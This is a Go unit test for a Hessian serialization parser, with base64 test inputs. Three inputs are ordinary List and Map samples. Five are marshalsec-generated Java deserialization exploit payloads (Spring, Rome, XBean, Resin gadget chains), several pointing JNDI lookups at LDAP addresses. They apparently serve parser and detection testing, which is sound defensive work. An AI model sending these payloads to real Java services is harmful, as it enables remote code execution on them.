package hessianserialparse

import (
	"encoding/base64"
	"testing"
)

func TestHessianParse(t *testing.T) {
	var tests = []struct {
		data string
	}{
		// 存在数据结构：List 和 Map
		{
			"TXQAEmNvbS5leGFtcGxlLlBlcnNvblMABG5hbWVTAARGZW5nUwADYWdlSQAAABJTAARMaXN0VnQAB1tzdHJpbmdsAAAAAVMAA2FiY3pTAANtYXBNdAAAUwAEa2V5MVMABnZhbHVlMXp6",
		},
		// 存在数据结构：Map
		{

			`TXQAEmNvbS5leGFtcGxlLlBlcnNvblMAA21hcE10AABTAARrZXkxUwAGdmFsdWUxeno=`,
		},
		// 存在数据结构：List
		{
			`TXQAEmNvbS5leGFtcGxlLlBlcnNvblMABG5hbWVTAARGZW5nUwADYWdlSQAAABJTAARMaXN0VnQAB1tzdHJpbmdsAAAAAVMAA2FiY3p6`,
		},
		// 反序列化利用，使用marshalsec生成，SpringPartiallyComparableAdvisorHolder
		{
			"TXQAAE10ADdvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmNlUwAGdGFyZ2V0TXQAbm9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmFzcGVjdGouYXV0b3Byb3h5LkFzcGVjdEpBd2FyZUFkdmlzb3JBdXRvUHJveHlDcmVhdG9yJFBhcnRpYWxseUNvbXBhcmFibGVBZHZpc29ySG9sZGVyUwAHYWR2aXNvck10ADZvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5hc3BlY3RqLkFzcGVjdEpQb2ludGN1dEFkdmlzb3JTAAVvcmRlck5TAAZhZHZpY2VNdAAzb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuYXNwZWN0ai5Bc3BlY3RKQXJvdW5kQWR2aWNlUwAOZGVjbGFyaW5nQ2xhc3NNdAAPamF2YS5sYW5nLkNsYXNzUwAEbmFtZVMAEGphdmEubGFuZy5PYmplY3R6UwAKbWV0aG9kTmFtZVMACHRvU3RyaW5nUwAKYXNwZWN0TmFtZU5TABBkZWNsYXJhdGlvbk9yZGVySQAAAABTAAx0aHJvd2luZ05hbWVOUwANcmV0dXJuaW5nTmFtZU5TABdkaXNjb3ZlcmVkUmV0dXJuaW5nVHlwZU5TABZkaXNjb3ZlcmVkVGhyb3dpbmdUeXBlTlMAFmpvaW5Qb2ludEFyZ3VtZW50SW5kZXhJAAAAAFMAIGpvaW5Qb2ludFN0YXRpY1BhcnRBcmd1bWVudEluZGV4SQAAAABTABVhcmd1bWVudHNJbnRyb3NwZWN0ZWRGUwAeZGlzY292ZXJlZFJldHVybmluZ0dlbmVyaWNUeXBlTlMADnBhcmFtZXRlclR5cGVzVnQAEFtqYXZhLmxhbmcuQ2xhc3NsAAAAAHpTAAhwb2ludGN1dE5TABVhc3BlY3RJbnN0YW5jZUZhY3RvcnlNdABLb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuYXNwZWN0ai5hbm5vdGF0aW9uLkJlYW5GYWN0b3J5QXNwZWN0SW5zdGFuY2VGYWN0b3J5UwAEbmFtZVMAE2xkYXA6Ly8xNzIuMTYuMjEwLjFTAAtiZWFuRmFjdG9yeU10ADZvcmcuc3ByaW5nZnJhbWV3b3JrLmpuZGkuc3VwcG9ydC5TaW1wbGVKbmRpQmVhbkZhY3RvcnlTAAtyZXNvdXJjZVJlZlRTABJzaGFyZWFibGVSZXNvdXJjZXNWdAARamF2YS51dGlsLkhhc2hTZXRsAAAAAVMAE2xkYXA6Ly8xNzIuMTYuMjEwLjF6UwAQc2luZ2xldG9uT2JqZWN0c010AAB6UwANcmVzb3VyY2VUeXBlc010AAB6UwAGbG9nZ2VyTXQAJ29yZy5hcGFjaGUuY29tbW9ucy5sb2dnaW5nLmltcGwuTm9PcExvZ3pTAAxqbmRpVGVtcGxhdGVNdAAlb3JnLnNwcmluZ2ZyYW1ld29yay5qbmRpLkpuZGlUZW1wbGF0ZVMABmxvZ2dlck10ACdvcmcuYXBhY2hlLmNvbW1vbnMubG9nZ2luZy5pbXBsLk5vT3BMb2d6UwALZW52aXJvbm1lbnROenpTAA5hc3BlY3RNZXRhZGF0YU56UwANYXJndW1lbnROYW1lc05TABBhcmd1bWVudEJpbmRpbmdzTnpTAAhwb2ludGN1dE56UwAKY29tcGFyYXRvck56elIAAAABTXQAN29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5Ib3RTd2FwcGFibGVUYXJnZXRTb3VyY2VTAAZ0YXJnZXRNdAAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZ1MABW1fb2JqUwAE5bqjAg0NUwAIbV9wYXJlbnROenpSAAAAD3o=",
		},
		// 反序列化利用，使用marshalsec生成，SpringAbstractBeanFactoryPointcutAdvisor
		{
			"TXQAAE10AEFvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5zdXBwb3J0LkRlZmF1bHRCZWFuRmFjdG9yeVBvaW50Y3V0QWR2aXNvclMADmFkdmljZUJlYW5OYW1lUwAQbGRhcDovLzEyNy4wLjAuMVMABW9yZGVyTlMACHBvaW50Y3V0TXQAJG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLlRydWVQb2ludGN1dHpTAAtiZWFuRmFjdG9yeU10ADZvcmcuc3ByaW5nZnJhbWV3b3JrLmpuZGkuc3VwcG9ydC5TaW1wbGVKbmRpQmVhbkZhY3RvcnlTAAtyZXNvdXJjZVJlZlRTABJzaGFyZWFibGVSZXNvdXJjZXNWdAARamF2YS51dGlsLkhhc2hTZXRsAAAAAVMAEGxkYXA6Ly8xMjcuMC4wLjF6UwAQc2luZ2xldG9uT2JqZWN0c010AAB6UwANcmVzb3VyY2VUeXBlc010AAB6UwAGbG9nZ2VyTXQAJ29yZy5hcGFjaGUuY29tbW9ucy5sb2dnaW5nLmltcGwuTm9PcExvZ3pTAAxqbmRpVGVtcGxhdGVNdAAlb3JnLnNwcmluZ2ZyYW1ld29yay5qbmRpLkpuZGlUZW1wbGF0ZVMABmxvZ2dlck10ACdvcmcuYXBhY2hlLmNvbW1vbnMubG9nZ2luZy5pbXBsLk5vT3BMb2d6UwALZW52aXJvbm1lbnROenp6UgAAAAFNdABBb3JnLnNwcmluZ2ZyYW1ld29yay5hb3Auc3VwcG9ydC5EZWZhdWx0QmVhbkZhY3RvcnlQb2ludGN1dEFkdmlzb3JTAA5hZHZpY2VCZWFuTmFtZU5TAAVvcmRlck5TAAhwb2ludGN1dFIAAAACUwALYmVhbkZhY3RvcnlOelIAAAAKeg==",
		},
		// 反序列化利用，使用marshalsec生成，Rome
		{
			"TXQAAE10ACdjb20ucm9tZXRvb2xzLnJvbWUuZmVlZC5pbXBsLkVxdWFsc0JlYW5TAAliZWFuQ2xhc3NNdAAPamF2YS5sYW5nLkNsYXNzUwAEbmFtZVMAKWNvbS5yb21ldG9vbHMucm9tZS5mZWVkLmltcGwuVG9TdHJpbmdCZWFuelMAA29iak10ACljb20ucm9tZXRvb2xzLnJvbWUuZmVlZC5pbXBsLlRvU3RyaW5nQmVhblMACWJlYW5DbGFzc010AA9qYXZhLmxhbmcuQ2xhc3NTAARuYW1lUwAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGx6UwADb2JqTXQAHWNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsUwAHY29tbWFuZE5TAANVUkxOUwAKZGF0YVNvdXJjZVMAEGxkYXA6Ly8xMjcuMC4wLjFTAApyb3dTZXRUeXBlSQAAA+xTAAtzaG93RGVsZXRlZEZTAAxxdWVyeVRpbWVvdXRJAAAAAFMAB21heFJvd3NJAAAAAFMADG1heEZpZWxkU2l6ZUkAAAAAUwALY29uY3VycmVuY3lJAAAD8FMACHJlYWRPbmx5VFMAEGVzY2FwZVByb2Nlc3NpbmdUUwAJaXNvbGF0aW9uSQAAAAJTAAhmZXRjaERpckkAAAPoUwAJZmV0Y2hTaXplSQAAAABTAARjb25uTlMAAnBzTlMAAnJzTlMABnJvd3NNRE5TAAVyZXNNRE5TAA1pTWF0Y2hDb2x1bW5zVnQAEGphdmEudXRpbC5WZWN0b3JsAAAACkn/////Sf////9J/////0n/////Sf////9J/////0n/////Sf////9J/////0n/////elMAD3N0ck1hdGNoQ29sdW1uc1Z0ABBqYXZhLnV0aWwuVmVjdG9ybAAAAApTAANmb29OTk5OTk5OTk56UwAMYmluYXJ5U3RyZWFtTlMADXVuaWNvZGVTdHJlYW1OUwALYXNjaWlTdHJlYW1OUwAKY2hhclN0cmVhbU5TAANtYXBOUwAJbGlzdGVuZXJzTlMABnBhcmFtc010ABNqYXZhLnV0aWwuSGFzaHRhYmxlenp6elIAAAABUgAAAAFSAAAAAXo=",
		},
		// 反序列化利用，使用marshalsec生成，XBean
		{
			"TXQAAE10ADdvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmNlUwAGdGFyZ2V0TXQAO29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuQ29udGV4dFV0aWwkUmVhZE9ubHlCaW5kaW5nUwAKaXNSZWxhdGl2ZUZTAARuYW1lUwADZm9vUwAJY2xhc3NOYW1lTlMACGZ1bGxOYW1lTlMABWlzUmVsVFMABXZhbHVlTXQAFmphdmF4Lm5hbWluZy5SZWZlcmVuY2VTAAljbGFzc05hbWVTAANmb29TAAxjbGFzc0ZhY3RvcnlTAAFiUwAUY2xhc3NGYWN0b3J5TG9jYXRpb25TAAFhUwAFYWRkcnNWdAAQamF2YS51dGlsLlZlY3RvcmwAAAAAenpTAAdjb250ZXh0TXQAL29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuV3JpdGFibGVDb250ZXh0UwAPY2FjaGVSZWZlcmVuY2VzRlMAFHN1cHBvcnRSZWZlcmVuY2VhYmxlRlMAGWNoZWNrRGVyZWZlcmVuY2VEaWZmZXJlbnRGUwAWYXNzdW1lRGVyZWZlcmVuY2VCb3VuZEZTAA9uYW1lSW5OYW1lc3BhY2VOUwAKbW9kaWZpYWJsZUZTAAZpbkNhbGxOUwAJd3JpdGVMb2NrTlMAC2JpbmRpbmdzUmVmTlMACGluZGV4UmVmTlMAEWNvbnRleHRGZWRlcmF0aW9uTlMADW1hc3RlckNvbnRleHROUwAVcGFyc2VkTmFtZUluTmFtZXNwYWNlTlMADWNvbnRleHRBY2Nlc3NOelMACGJvdW5kT2JqUgAAAAN6elIAAAABTXQAN29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5Ib3RTd2FwcGFibGVUYXJnZXRTb3VyY2VTAAZ0YXJnZXRNdAAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZ1MABW1fb2JqUwAE4KyCAxccUwAIbV9wYXJlbnROenpSAAAABno=",
		},
		// 反序列化利用，使用marshalsec生成，Resin
		{
			"TXQAAE10ABdjb20uY2F1Y2hvLm5hbWluZy5RTmFtZVMACF9jb250ZXh0TXQAJ2phdmF4Lm5hbWluZy5zcGkuQ29udGludWF0aW9uRGlyQ29udGV4dFMAA2NwZU10ACNqYXZheC5uYW1pbmcuQ2Fubm90UHJvY2VlZEV4Y2VwdGlvblMADXJvb3RFeGNlcHRpb25OUwANZGV0YWlsTWVzc2FnZU5TAAVjYXVzZU5TABByZW1haW5pbmdOZXdOYW1lTlMAC2Vudmlyb25tZW50TlMAB2FsdE5hbWVOUwAKYWx0TmFtZUN0eE5TAAxyZXNvbHZlZE5hbWVOUwALcmVzb2x2ZWRPYmpNdAAWamF2YXgubmFtaW5nLlJlZmVyZW5jZVMACWNsYXNzTmFtZVMAA0Zvb1MADGNsYXNzRmFjdG9yeVMAAWJTABRjbGFzc0ZhY3RvcnlMb2NhdGlvblMAAWFTAAVhZGRyc1Z0ABBqYXZhLnV0aWwuVmVjdG9ybAAAAAB6elMADXJlbWFpbmluZ05hbWVOUwAKc3RhY2tUcmFjZVZ0ABxbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50bAAAAAlNdAAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50UwAOZGVjbGFyaW5nQ2xhc3NTABhtYXJzaGFsc2VjLmdhZGdldHMuUmVzaW5TAAptZXRob2ROYW1lUwAObWFrZVJlc2luUU5hbWVTAAhmaWxlTmFtZVMAClJlc2luLmphdmFTAApsaW5lTnVtYmVySQAAADh6TXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsUwAKbWV0aG9kTmFtZVMAB2ludm9rZTBTAAhmaWxlTmFtZVMAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhUwAKbGluZU51bWJlckn////+ek10ABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRTAA5kZWNsYXJpbmdDbGFzc1MAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbFMACm1ldGhvZE5hbWVTAAZpbnZva2VTAAhmaWxlTmFtZVMAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhUwAKbGluZU51bWJlckkAAAA+ek10ABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRTAA5kZWNsYXJpbmdDbGFzc1MAKHN1bi5yZWZsZWN0LkRlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGxTAAptZXRob2ROYW1lUwAGaW52b2tlUwAIZmlsZU5hbWVTACFEZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsLmphdmFTAApsaW5lTnVtYmVySQAAACt6TXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAYamF2YS5sYW5nLnJlZmxlY3QuTWV0aG9kUwAKbWV0aG9kTmFtZVMABmludm9rZVMACGZpbGVOYW1lUwALTWV0aG9kLmphdmFTAApsaW5lTnVtYmVySQAAAfJ6TXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAZbWFyc2hhbHNlYy5NYXJzaGFsbGVyQmFzZVMACm1ldGhvZE5hbWVTAAxjcmVhdGVPYmplY3RTAAhmaWxlTmFtZVMAE01hcnNoYWxsZXJCYXNlLmphdmFTAApsaW5lTnVtYmVySQAAAUt6TXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAZbWFyc2hhbHNlYy5NYXJzaGFsbGVyQmFzZVMACm1ldGhvZE5hbWVTAAVkb1J1blMACGZpbGVOYW1lUwATTWFyc2hhbGxlckJhc2UuamF2YVMACmxpbmVOdW1iZXJJAAAApXpNdAAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50UwAOZGVjbGFyaW5nQ2xhc3NTABltYXJzaGFsc2VjLk1hcnNoYWxsZXJCYXNlUwAKbWV0aG9kTmFtZVMAA3J1blMACGZpbGVOYW1lUwATTWFyc2hhbGxlckJhc2UuamF2YVMACmxpbmVOdW1iZXJJAAAAeXpNdAAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50UwAOZGVjbGFyaW5nQ2xhc3NTABJtYXJzaGFsc2VjLkhlc3NpYW5TAAptZXRob2ROYW1lUwAEbWFpblMACGZpbGVOYW1lUwAMSGVzc2lhbi5qYXZhUwAKbGluZU51bWJlckkAAABAenpTABRzdXBwcmVzc2VkRXhjZXB0aW9uc056UwADZW52TXQAE2phdmEudXRpbC5IYXNodGFibGV6UwAHY29udEN0eE56UwAGX2l0ZW1zVmwAAAACUwADZm9vUwADYmFyenpSAAAAAU10ADFjb20uc3VuLm9yZy5hcGFjaGUueHBhdGguaW50ZXJuYWwub2JqZWN0cy5YU3RyaW5nUwAFbV9vYmpTAATrp6YPGgtTAAhtX3BhcmVudE56UgAAABJ6",
		},
	}

	for id, test := range tests {
		data, _ := base64.StdEncoding.DecodeString(test.data)
		p, err := NewHessianParse(data)
		if p == nil || err != nil {
			t.Errorf("NewHessianParse(%d) error: %v", id, err)
		}

	}
}
